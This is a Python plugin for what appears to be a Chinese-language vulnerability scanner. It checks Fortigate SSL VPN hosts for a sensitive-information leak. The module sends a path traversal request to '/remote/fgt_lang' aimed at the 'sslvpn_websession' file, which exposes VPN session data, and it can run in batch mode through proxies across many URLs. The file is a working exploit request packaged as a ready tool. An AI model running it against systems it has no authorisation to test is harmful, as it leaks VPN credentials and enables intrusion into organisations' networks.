#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings()


class FortigateIndoScan:

    def run(self, urls):
        url = urls + '/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
        # print(head)
        try:
            response = requests.get(url, headers=self.headers,verify=self.ssl, timeout=5, proxies=self.proxy)
            if "fgt_lang =" in response.text:
                OutPrintInfo("Fortigate", f'存在Fortigate敏感信息泄漏{url}')
                if self.batch:
                    OutPutFile("fortigate_info.txt",f'存在Fortigate敏感信息泄漏{url}')
            else:
                if not self.batch:
                    OutPrintInfo("Fortigate", '不存在Fortigate敏感信息泄漏')

        except Exception:
            if not self.batch:
                OutPrintInfo("Fortigate", '目标请求出错')

    def main(self, target):
        self.batch = target["batch_work"]

        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("Fortigate", '开始执行Fortigate敏感信息泄漏检测')
        self.run(url)
        if not self.batch:
            OutPrintInfo("Fortigate", 'Fortigate敏感信息泄漏执行结束')
